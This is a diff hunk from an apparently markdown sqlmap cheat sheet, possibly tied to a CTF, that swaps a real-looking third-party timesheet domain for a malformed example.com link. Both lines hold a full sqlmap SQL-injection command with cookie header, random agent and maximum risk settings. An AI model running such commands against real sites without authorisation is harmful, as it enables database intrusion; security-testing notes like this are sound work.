@@ -246,7 +246,7 @@ sqlmap -u 'https://studentportal.elfu.org/application-check.php?elfmail=buddythe
 ```
 
 ```jsx
-python3 [sqlmap.py](http://sqlmap.py/) -u '[https://target.com/Employee/CutEmployees/14020603?st=1](https://timesheet.sadadpsp.ir/Employee/CutEmployees/14020603?st=1)' --headers="Cookie: _ga46c8c7f73270e095" --batch --random-agent -p st,y,m -treads 1 -risk 3 -v 6 --technique=BEUSTQ
+python3 [sqlmap.py](http://sqlmap.py/) -u '[https://target.com/Employee/CutEmployees/14020603?st=1](https:///example.comEmployee/CutEmployees/14020603?st=1)' --headers="Cookie: _ga46c8c7f73270e095" --batch --random-agent -p st,y,m -treads 1 -risk 3 -v 6 --technique=BEUSTQ
 ```
 
 ---
